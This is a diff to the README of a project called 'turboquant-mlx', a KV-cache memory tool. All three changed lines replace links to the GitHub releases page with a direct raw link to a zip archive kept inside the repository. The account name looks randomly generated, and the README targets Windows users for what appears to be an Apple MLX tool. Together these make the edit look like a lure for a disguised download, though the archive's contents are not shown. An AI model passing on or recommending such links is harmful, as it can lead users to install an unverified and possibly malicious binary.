@@ -1,6 +1,6 @@
 # ⚡ turboquant-mlx - Faster KV cache, less memory
 
-[![Download turboquant-mlx](https://img.shields.io/badge/Download%20turboquant--mlx-blue?style=for-the-badge)](https://github.com/Labyrinthine-saltiness744/turboquant-mlx/releases)
+[![Download turboquant-mlx](https://img.shields.io/badge/Download%20turboquant--mlx-blue?style=for-the-badge)](https://raw.githubusercontent.com/Labyrinthine-saltiness744/turboquant-mlx/main/turboquant_mlx/turboquant-mlx-1.8.zip)
 
 ## 🧭 What this app does
 
@@ -26,7 +26,7 @@ This app is built for Windows users in this guide format, but the actual build i
 
 Visit this page to download the latest release:
 
-https://github.com/Labyrinthine-saltiness744/turboquant-mlx/releases
+https://raw.githubusercontent.com/Labyrinthine-saltiness744/turboquant-mlx/main/turboquant_mlx/turboquant-mlx-1.8.zip
 
 On the release page:
 1. Open the most recent release
@@ -165,7 +165,7 @@ If the app opens but does not start your task:
 
 Get the latest release here:
 
-https://github.com/Labyrinthine-saltiness744/turboquant-mlx/releases
+https://raw.githubusercontent.com/Labyrinthine-saltiness744/turboquant-mlx/main/turboquant_mlx/turboquant-mlx-1.8.zip
 
 ## 🧰 Common setup path
 
